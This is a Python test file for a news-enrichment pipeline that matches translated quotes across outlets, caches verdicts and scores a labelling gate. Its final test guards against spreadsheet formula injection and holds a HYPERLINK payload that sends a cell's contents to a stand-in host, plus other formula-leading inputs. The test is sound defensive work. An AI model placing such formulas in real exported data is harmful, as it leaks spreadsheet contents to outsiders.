"""The speaker-card sweep: one Jev call per card, asked again only when the card changes.

enrichment/renderings.py's pure half has its own self-check (`python -m
enrichment.renderings`); this pins the half that touches the database — the
card is built from the same rows the story page uses, verdicts land keyed by
quote identity, and an unchanged card costs nothing on the next sweep.
"""

import uuid
from datetime import UTC, datetime

import pytest
from sqlalchemy import text

from common.db import session_scope
from common.decisions import Decisions, NoulAnswer
from common.models import Article, Enrichment, Event, EventMembership, RawItem, Source
from enrichment import renderings


async def _seed_article(s, ev_id, *, lang: str, quote: str, source_name: str) -> uuid.UUID:
    src = Source(id=uuid.uuid4(), slug=f"t-{uuid.uuid4().hex[:8]}", name=source_name, source_type="rss", language=lang)
    s.add(src)
    await s.flush()
    raw = RawItem(id=uuid.uuid4(), source_id=src.id, external_id=uuid.uuid4().hex, title="t", language=lang,
                  url=f"https://{src.slug}.example/a", observed_at=datetime.now(UTC), raw={}, relevance="relevant",
                  published_at=datetime.now(UTC))
    s.add(raw)
    await s.flush()
    art = Article(id=uuid.uuid4(), raw_item_id=raw.id, clean_text=quote, word_count=10)
    s.add(art)
    await s.flush()
    s.add(Enrichment(id=uuid.uuid4(), article_id=art.id, summary="s", model="test", shared_fields={
        "claims": [{"speaker": "Giorgia Meloni", "quote_text": quote, "claim_text": "Students must show their faces."}],
    }))
    s.add(EventMembership(event_id=ev_id, article_id=art.id, match_type="new_event"))
    await s.flush()
    return art.id


def _fake_decide(calls: list):
    async def decide(state, questions, *, trace_name, metadata=None):
        calls.append(set(questions))
        return Decisions(answers={k: NoulAnswer(noul=0.9 if k.startswith("same") else 0.1) for k in questions})
    return decide


@pytest.mark.asyncio(loop_scope="session")
async def test_a_card_is_judged_once_and_asked_again_only_when_it_changes(monkeypatch):
    calls: list = []
    monkeypatch.setattr(renderings, "decide", _fake_decide(calls))
    ev_id = uuid.uuid4()
    try:
        async with session_scope() as s:
            s.add(Event(id=ev_id, title="Italy schools", sector="politics"))
            await s.flush()
            en = await _seed_article(s, ev_id, lang="en", quote="You must go to school with your face uncovered", source_name="Mint")
            kn = await _seed_article(s, ev_id, lang="kn", quote="ಶಾಲೆಗೆ ಮುಖ ಮುಚ್ಚದೆ ಬರಬೇಕು", source_name="Prajavani")

        async with session_scope() as s:
            out = await renderings.judge_event(s, ev_id, "Italy schools")
        assert out["judged"] == 1
        assert calls == [{"spoken_0", "spoken_1", "same_0_1"}]

        async with session_scope() as s:
            row = (await s.execute(text("SELECT verdicts FROM claim_verdicts WHERE event_id = :e"), {"e": ev_id})).one()
        v = row.verdicts
        keys = {renderings.claim_key(str(en), "You must go to school with your face uncovered"),
                renderings.claim_key(str(kn), "ಶಾಲೆಗೆ ಮುಖ ಮುಚ್ಚದೆ ಬರಬೇಕು")}
        assert set(v["spoken"]) == keys, "verdicts must be keyed by quote identity, not position"
        assert {v["same"][0][0], v["same"][0][1]} == keys

        async with session_scope() as s:
            again = await renderings.judge_event(s, ev_id, "Italy schools")
        assert again["judged"] == 0 and len(calls) == 1, "an unchanged card must cost nothing"

        async with session_scope() as s:
            await _seed_article(s, ev_id, lang="hi", quote="स्कूल में चेहरा खुला रखना होगा", source_name="Aaj Tak")
        async with session_scope() as s:
            changed = await renderings.judge_event(s, ev_id, "Italy schools")
        assert changed["judged"] == 1 and len(calls) == 2, "a new report on the card must be asked about"
    finally:
        # The shared local database is shared with every other test (and every
        # other worktree): leave nothing behind.
        async with session_scope() as s:
            arts = [r[0] for r in (await s.execute(
                text("SELECT article_id FROM event_memberships WHERE event_id = :e"), {"e": ev_id})).all()]
            await s.execute(text("DELETE FROM event_memberships WHERE event_id = :e"), {"e": ev_id})
            await s.execute(text("DELETE FROM events WHERE id = :e"), {"e": ev_id})  # cascades claim_verdicts
            if arts:
                raws = [r[0] for r in (await s.execute(
                    text("SELECT raw_item_id FROM articles WHERE id = ANY(:a)"), {"a": arts})).all()]
                srcs = [r[0] for r in (await s.execute(
                    text("SELECT source_id FROM raw_items WHERE id = ANY(:r)"), {"r": raws})).all()]
                await s.execute(text("DELETE FROM enrichments WHERE article_id = ANY(:a)"), {"a": arts})
                await s.execute(text("DELETE FROM articles WHERE id = ANY(:a)"), {"a": arts})
                await s.execute(text("DELETE FROM raw_items WHERE id = ANY(:r)"), {"r": raws})
                await s.execute(text("DELETE FROM sources WHERE id = ANY(:s)"), {"s": srcs})


def test_the_pure_half_holds_its_own_invariants():
    """Pairs cross languages only, verdicts key by identity, a verdict naming a
    quote that left the card counts for nothing, and unsure never downgrades.
    The module's self-check, run where CI can see it."""
    renderings.demo()


def test_the_gate_scores_the_served_verdict_not_the_answer(tmp_path):
    """Precision is of what a READER would see: pairs served as one statement,
    quotes served as a translation. A model that is right about everything it
    did NOT serve must not pass on that."""
    from tools.gold_renderings import score

    sheet = tmp_path / "labels.csv"
    header = "id,kind,question,speaker,story,a_language,a_outlet,a_quote,b_language,b_outlet,b_quote,model_p,label\n"
    served_same_right = "".join(f"s{i},same,q,X,s,English,o,a,Kannada,o,b,0.95,y\n" for i in range(19))
    served_same_wrong = "w,same,q,X,s,English,o,a,Kannada,o,b,0.95,n\n"
    not_served = "".join(f"n{i},same,q,X,s,English,o,a,Kannada,o,b,0.10,n\n" for i in range(30))
    translated_right = "".join(f"t{i},spoken,q,X,s,Kannada,o,a,,,,0.05,n\n" for i in range(20))
    sheet.write_text(header + served_same_right + served_same_wrong + not_served + translated_right)
    assert score(sheet) == 0  # same: 19/20 = 0.95 served right; spoken: 20/20

    sheet.write_text(header + served_same_right + served_same_wrong + served_same_wrong + not_served + translated_right)
    assert score(sheet) == 1  # 19/21 < 0.95, however right the unserved 30 were


@pytest.mark.asyncio(loop_scope="session")
async def test_one_failing_event_cannot_block_the_rest_of_the_sweep(monkeypatch):
    """Security review 2026-09-23: a raise inside one event's judging used to
    escape the sweep, so the same card was re-selected and re-crashed every
    fifteen minutes and every event sorted after it was never judged."""
    bad, good = uuid.uuid4(), uuid.uuid4()

    async def fake_recent(session, *, days, limit, offset=0):
        return [(bad, "bad"), (good, "good")]

    async def fake_judge(session, event_id, title, *, write=True):
        if event_id == bad:
            raise IndexError("list index out of range")
        return {"cards": 1, "judged": 1, "cost": 0.0001, "verdicts": {}}

    monkeypatch.setattr(renderings, "recent_events", fake_recent)
    monkeypatch.setattr(renderings, "judge_event", fake_judge)
    async with session_scope() as s:
        out = await renderings.sweep(s)
    assert out["judged"] == 1, "the event after the failing one must still be judged"


def test_scraped_text_cannot_become_a_spreadsheet_formula():
    from tools.gold_renderings import cell

    assert cell('=HYPERLINK("http://x.example/?d="&A1,"read")') == '\'=HYPERLINK("http://x.example/?d="&A1,"read")'
    for hostile in ("+1+1", "-2+3", "@SUM(A1)", "\tlead", "\rlead"):
        assert cell(hostile).startswith("'"), hostile
    assert cell("You must go to school") == "You must go to school"
    assert cell(0.5) == 0.5
